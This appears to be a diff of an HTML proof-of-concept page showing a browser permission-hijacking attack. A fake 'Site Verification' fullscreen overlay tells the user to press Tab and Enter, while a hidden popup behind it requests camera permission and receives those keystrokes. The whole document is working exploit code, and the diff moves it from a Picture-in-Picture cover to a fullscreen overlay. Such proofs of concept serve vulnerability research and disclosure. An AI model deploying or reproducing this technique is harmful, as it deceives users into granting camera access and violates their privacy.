@@ -3,203 +3,203 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Video PiP Overlap PoC</title>
+  <title>Fullscreen Overlap PoC</title>
   <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
       background-color: #f0f0f0;
       font-family: Arial, sans-serif;
     }
     h2 { margin-bottom: 20px; }
-    button {
-      padding: 12px 28px;
-      font-size: 16px;
+    #verify-btn {
+      padding: 14px 32px;
+      font-size: 17px;
       cursor: pointer;
       background-color: #0dd438;
       color: white;
       border: none;
       border-radius: 5px;
     }
-    /* Hidden canvas + video — never visible to user */
-    #hidden-video, #instruction-canvas {
+    /* ── Fullscreen overlay (hidden until triggered) ── */
+    #overlay {
+      display: none;
       position: fixed;
-      left: -9999px;
-      top: -9999px;
+      inset: 0;
+      z-index: 999999;
+      background: #f0f0f0;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+    }
+    #overlay.active { display: flex; }
+    #overlay h1 {
+      font-size: 32px;
+      color: #333;
+      margin-bottom: 8px;
+    }
+    #overlay .step-label {
+      font-size: 24px;
+      color: #0dd438;
+      font-weight: bold;
+      margin-bottom: 24px;
+    }
+    #overlay .instruction {
+      font-size: 22px;
+      color: #222;
+      text-align: center;
+      line-height: 1.6;
+      margin-bottom: 30px;
+    }
+    #overlay .keys {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      margin-bottom: 30px;
+    }
+    .key-box {
+      background: #fff;
+      border: 2px solid #aaa;
+      border-radius: 8px;
+      padding: 10px 18px;
+      font-weight: bold;
+      font-size: 16px;
+      color: #333;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.15);
+    }
+    .arrow {
+      font-size: 22px;
+      color: #999;
+    }
+    .pulse-dot {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: #0dd438;
+      animation: pulse 1s ease-in-out infinite;
+      margin-bottom: 10px;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 0.4; transform: scale(0.9); }
+      50%      { opacity: 1;   transform: scale(1.1); }
+    }
+    .sub-text {
+      font-size: 14px;
+      color: #888;
+    }
+    .verified {
+      font-size: 36px;
+      color: #0dd438;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
   <h2>Site Verification Required</h2>
   <button id="verify-btn">Verify</button>
-  <canvas id="instruction-canvas" width="640" height="480"></canvas>
-  <video id="hidden-video" muted autoplay></video>
+  <!-- Fullscreen overlay with verification instructions -->
+  <div id="overlay">
+    <h1 id="ov-title">2-Step Verification</h1>
+    <div class="step-label" id="ov-step">Step 1 of 2</div>
+    <div class="instruction" id="ov-instruction">
+      Press the Tab key 3 times,<br>then press Enter to continue.
+    </div>
+    <div class="keys" id="ov-keys">
+      <div class="key-box">Tab</div>
+      <div class="key-box">Tab</div>
+      <div class="key-box">Tab</div>
+      <span class="arrow">→</span>
+      <div class="key-box">Enter</div>
+    </div>
+    <div class="pulse-dot" id="ov-pulse"></div>
+    <div class="sub-text" id="ov-sub">Waiting for input…</div>
+  </div>
   <script>
-    const canvas = document.getElementById('instruction-canvas');
-    const ctx = canvas.getContext('2d');
-    const video = document.getElementById('hidden-video');
+    const overlay     = document.getElementById('overlay');
+    const ovStep      = document.getElementById('ov-step');
+    const ovInstr     = document.getElementById('ov-instruction');
+    const ovKeys      = document.getElementById('ov-keys');
+    const ovSub       = document.getElementById('ov-sub');
+    const ovPulse     = document.getElementById('ov-pulse');
+    const ovTitle     = document.getElementById('ov-title');
     let popupWindow = null;
-    let currentStep = 1;
-    let animFrame = null;
-    /* ══════ Canvas drawing ══════ */
-    function drawStep(step) {
-      ctx.fillStyle = '#f0f0f0';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = '#333';
-      ctx.font = 'bold 28px Arial';
-      ctx.textAlign = 'center';
-      ctx.fillText('2-Step Verification', canvas.width / 2, 60);
-      ctx.strokeStyle = '#ccc';
-      ctx.beginPath();
-      ctx.moveTo(40, 80);
-      ctx.lineTo(canvas.width - 40, 80);
-      ctx.stroke();
-      if (step === 1) {
-        ctx.fillStyle = '#0dd438';
-        ctx.font = 'bold 22px Arial';
-        ctx.fillText('Step 1 of 2', canvas.width / 2, 130);
-        ctx.fillStyle = '#222';
-        ctx.font = '20px Arial';
-        ctx.fillText('Press the Tab key 3 times,', canvas.width / 2, 200);
-        ctx.fillText('then press Enter to continue.', canvas.width / 2, 235);
-        drawKey(ctx, 200, 280, 'Tab');
-        drawKey(ctx, 280, 280, 'Tab');
-        drawKey(ctx, 360, 280, 'Tab');
-        drawArrow(ctx, 400, 295, 430, 295);
-        drawKey(ctx, 440, 280, 'Enter');
-        pulse(ctx, canvas.width / 2, 380);
-        ctx.fillStyle = '#555';
-        ctx.font = '14px Arial';
-        ctx.fillText('Waiting for input…', canvas.width / 2, 420);
-      } else if (step === 2) {
-        ctx.fillStyle = '#0dd438';
-        ctx.font = 'bold 22px Arial';
-        ctx.fillText('Step 2 of 2', canvas.width / 2, 130);
-        ctx.fillStyle = '#222';
-        ctx.font = '20px Arial';
-        ctx.fillText('Press Enter twice to', canvas.width / 2, 200);
-        ctx.fillText('complete verification.', canvas.width / 2, 235);
-        drawKey(ctx, 250, 280, 'Enter');
-        drawKey(ctx, 340, 280, 'Enter');
-        pulse(ctx, canvas.width / 2, 370);
-        ctx.fillStyle = '#555';
-        ctx.font = '14px Arial';
-        ctx.fillText('Almost done…', canvas.width / 2, 410);
-      } else if (step === 3) {
-        ctx.fillStyle = '#0dd438';
-        ctx.font = 'bold 26px Arial';
-        ctx.fillText('✓ Verified!', canvas.width / 2, 220);
-        ctx.fillStyle = '#555';
-        ctx.font = '18px Arial';
-        ctx.fillText('You may close this window.', canvas.width / 2, 265);
-      }
+    /* ══════ Show step in overlay ══════ */
+    function showStep1() {
+      ovStep.textContent = 'Step 1 of 2';
+      ovInstr.innerHTML = 'Press the Tab key 3 times,<br>then press Enter to continue.';
+      ovKeys.innerHTML = `
+        <div class="key-box">Tab</div>
+        <div class="key-box">Tab</div>
+        <div class="key-box">Tab</div>
+        <span class="arrow">→</span>
+        <div class="key-box">Enter</div>
+      `;
+      ovSub.textContent = 'Waiting for input…';
+      ovPulse.style.display = 'block';
     }
-    function drawKey(ctx, x, y, label) {
-      const w = label === 'Enter' ? 70 : 55;
-      ctx.fillStyle = '#fff';
-      ctx.strokeStyle = '#aaa';
-      ctx.lineWidth = 2;
-      roundRect(ctx, x, y, w, 36, 6);
-      ctx.fill();
-      ctx.stroke();
-      ctx.fillStyle = '#333';
-      ctx.font = 'bold 14px Arial';
-      ctx.textAlign = 'center';
-      ctx.fillText(label, x + w / 2, y + 23);
+    function showStep2() {
+      ovStep.textContent = 'Step 2 of 2';
+      ovInstr.innerHTML = 'Press Enter twice to<br>complete verification.';
+      ovKeys.innerHTML = `
+        <div class="key-box">Enter</div>
+        <div class="key-box">Enter</div>
+      `;
+      ovSub.textContent = 'Almost done…';
     }
-    function drawArrow(ctx, x1, y1, x2, y2) {
-      ctx.strokeStyle = '#999';
-      ctx.lineWidth = 2;
-      ctx.beginPath();
-      ctx.moveTo(x1, y1);
-      ctx.lineTo(x2, y2);
-      ctx.stroke();
-      ctx.beginPath();
-      ctx.moveTo(x2, y2);
-      ctx.lineTo(x2 - 6, y2 - 4);
-      ctx.lineTo(x2 - 6, y2 + 4);
-      ctx.closePath();
-      ctx.fillStyle = '#999';
-      ctx.fill();
-    }
-    function pulse(ctx, x, y) {
-      const alpha = 0.5 + 0.5 * Math.sin(Date.now() / 300);
-      ctx.fillStyle = `rgba(13, 212, 56, ${alpha})`;
-      ctx.beginPath();
-      ctx.arc(x, y, 12, 0, Math.PI * 2);
-      ctx.fill();
-    }
-    function roundRect(ctx, x, y, w, h, r) {
-      ctx.beginPath();
-      ctx.moveTo(x + r, y);
-      ctx.lineTo(x + w - r, y);
-      ctx.quadraticCurveTo(x + w, y, x + w, y + r);
-      ctx.lineTo(x + w, y + h - r);
-      ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
-      ctx.lineTo(x + r, y + h);
-      ctx.quadraticCurveTo(x, y + h, x, y + h - r);
-      ctx.lineTo(x, y + r);
-      ctx.quadraticCurveTo(x, y, x + r, y);
-      ctx.closePath();
-    }
-    /* ══════ Animation loop ══════ */
-    function animate() {
-      drawStep(currentStep);
-      animFrame = requestAnimationFrame(animate);
+    function showVerified() {
+      ovStep.textContent = '';
+      ovInstr.innerHTML = '';
+      ovKeys.innerHTML = '';
+      ovTitle.innerHTML = '<span class="verified">✓ Verified!</span>';
+      ovSub.textContent = '';
+      ovPulse.style.display = 'none';
     }
     /* ══════ Main trigger ══════ */
     document.getElementById('verify-btn').addEventListener('click', async () => {
-      currentStep = 1;
-      animate();
-      // Canvas → video stream → PiP
-      const stream = canvas.captureStream(30);
-      video.srcObject = stream;
-      await video.play();
+      // Show overlay + go fullscreen — covers the entire screen
+      overlay.classList.add('active');
+      showStep1();
       try {
-        await video.requestPictureInPicture();
+        await document.documentElement.requestFullscreen();
       } catch (e) {
-        console.error('PiP failed:', e);
-        return;
+        // Fullscreen denied — overlay still covers the page
       }
-      // Open tiny popup BEHIND the PiP — it auto-requests camera
+      // Open tiny popup BEHIND the fullscreen page
+      // The popup auto-requests camera permission on load
       popupWindow = window.open(
         'permission.html',
         'permPopup',
-        'width=100,height=100,left=850,top=650'
+        'width=100,height=100,left=900,top=700'
       );
-      // Give focus back to popup so keystrokes reach the permission dialog
+      // Give focus to the popup so Tab/Enter reach its permission dialog
+      // The popup is visually hidden behind our fullscreen page
       setTimeout(() => {
         if (popupWindow) popupWindow.focus();
-      }, 300);
-    });
-    /* ══════ Keystroke tracking (on the main window) ══════ */
-    // We DON'T intercept keys here — the Tab/Enter keystrokes go
-    // directly to the popup's permission dialog.
-    // We just poll the popup to detect when it closes (= permission granted).
-    setInterval(() => {
-      if (popupWindow && popupWindow.closed) {
-        // Popup closed itself → camera was granted
-        if (currentStep < 3) {
-          currentStep = 3;
-          // Close PiP after showing "Verified"
+      }, 500);
+      // Poll: detect when popup closes itself (= camera granted)
+      const poll = setInterval(() => {
+        if (popupWindow && popupWindow.closed) {
+          clearInterval(poll);
+          popupWindow = null;
+          showVerified();
+          // Exit fullscreen after showing "Verified"
           setTimeout(() => {
-            if (document.pictureInPictureElement) {
-              document.exitPictureInPicture().catch(() => {});
+            overlay.classList.remove('active');
+            if (document.fullscreenElement) {
+              document.exitFullscreen().catch(() => {});
             }
-            cancelAnimationFrame(animFrame);
           }, 1500);
         }
-        popupWindow = null;
-      }
-    }, 500);
-    // If user manually closes PiP, clean up
-    video.addEventListener('leavepictureinpicture', () => {
-      cancelAnimationFrame(animFrame);
-      if (popupWindow) popupWindow.close();
+      }, 300);
+    });
+    // If user manually exits fullscreen, keep the overlay visible anyway
+    document.addEventListener('fullscreenchange', () => {
+      // overlay stays active regardless
     });
   </script>
 </body>
